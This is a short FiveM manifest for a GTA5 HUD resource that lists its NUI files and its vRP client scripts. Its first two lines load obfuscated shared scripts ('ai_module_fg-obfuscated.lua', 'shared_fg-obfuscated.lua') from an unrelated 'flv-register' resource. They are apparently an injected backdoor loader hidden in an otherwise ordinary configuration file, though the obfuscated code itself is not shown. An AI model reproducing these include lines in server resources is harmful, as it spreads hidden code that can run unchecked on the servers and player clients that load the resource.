shared_script '@flv-register/ai_module_fg-obfuscated.lua'
shared_script '@flv-register/shared_fg-obfuscated.lua'
fx_version 'adamant'
games { 'gta5' }

description "hud"

ui_page "nui/index.html"

files {
	'nui/index.html',
	'nui/style.css',
  'nui/*.woff',
  'nui/**/**',
  'nui/*',
  'nui/scripts.js',
}

client_scripts{ 
  "@vrp/client/Tunnel.lua",
  "@vrp/client/Proxy.lua",
  "client.lua"
}